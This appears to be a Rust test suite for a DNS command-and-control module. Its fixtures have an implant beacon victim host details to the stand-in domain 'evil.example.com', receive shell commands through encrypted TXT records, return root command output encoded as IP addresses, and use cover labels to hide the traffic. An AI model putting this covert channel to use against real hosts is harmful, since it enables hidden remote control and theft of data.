use aegis_orchestrator::c2_dns::*;
use aegis_orchestrator::c2_protocol::*;

fn test_config() -> DnsC2Config {
    DnsC2Config {
        base_domain: "evil.example.com".to_string(),
        implant_id: "imp42".to_string(),
        max_label_len: 63,
        jitter_ms: 0,
        ttl_secs: 30,
    }
}

fn test_beacon() -> BeaconMessage {
    BeaconMessage {
        implant_id: "imp42".to_string(),
        timestamp: 1700000000,
        hostname: "victim-pc".to_string(),
        username: "admin".to_string(),
        os: "Windows 11".to_string(),
        ip: "192.168.1.50".to_string(),
        payload_type: PayloadType::Checkin,
        data: b"checkin".to_vec(),
    }
}

fn test_command() -> CommandMessage {
    CommandMessage {
        command_id: "cmd-100".to_string(),
        implant_id: "imp42".to_string(),
        command_type: CommandType::Shell,
        args: vec!["id".to_string()],
        timeout_secs: 15,
    }
}

#[test]
fn test_beacon_encode_decode_roundtrip() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let config = test_config();
    let beacon = test_beacon();

    let queries = encode_beacon_as_dns_queries(&beacon, &cipher, &config).expect("encode");
    assert!(!queries.is_empty());

    let decoded = decode_dns_queries_to_beacon(&queries, &cipher, &config).expect("decode");
    assert_eq!(decoded.implant_id, "imp42");
    assert_eq!(decoded.hostname, "victim-pc");
    assert_eq!(decoded.data, b"checkin");
}

#[test]
fn test_command_txt_roundtrip() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let cmd = test_command();

    let txt = encode_command_as_txt(&cmd, &cipher).expect("encode");
    let decoded = decode_txt_to_command(&txt, &cipher).expect("decode");
    assert_eq!(decoded.command_id, "cmd-100");
    assert_eq!(decoded.command_type, CommandType::Shell);
}

#[test]
fn test_ip_sequence_roundtrip() {
    let data = b"uid=0(root)";
    let ips = encode_response_as_ip_sequence(data);
    let decoded = decode_ip_sequence_to_response(&ips).expect("decode");
    assert_eq!(decoded, data);
}

#[test]
fn test_client_server_full_flow() {
    let key = SessionCipher::generate_key();
    let config = test_config();
    let dns = MockDnsServer::new();

    let client = DnsC2Client::new(config.clone(), &key, dns.clone());
    let mut server = DnsC2Server::new(config, &key, dns);

    let queries = client.send_beacon(&test_beacon()).expect("send");
    let received = server.receive_beacon(&queries).expect("recv");
    assert_eq!(received.implant_id, "imp42");

    server.send_command(&test_command()).expect("send cmd");
    let polled = client.poll_command().expect("poll").expect("has cmd");
    assert_eq!(polled.command_id, "cmd-100");
}

#[test]
fn test_mock_dns_txt_records() {
    let dns = MockDnsServer::new();
    assert!(dns.query_txt("test").is_none());
    dns.set_txt_record("test", "value");
    assert_eq!(dns.query_txt("test").as_deref(), Some("value"));
}

#[test]
fn test_cover_labels_generation() {
    let labels = generate_cover_labels(4);
    assert_eq!(labels.len(), 4);
    assert_eq!(labels[0], "www");
}

#[test]
fn test_shuffled_queries_still_decode() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let config = test_config();

    let mut queries =
        encode_beacon_as_dns_queries(&test_beacon(), &cipher, &config).expect("encode");
    if queries.len() > 1 {
        queries.reverse();
    }
    let decoded = decode_dns_queries_to_beacon(&queries, &cipher, &config).expect("decode");
    assert_eq!(decoded.implant_id, "imp42");
}
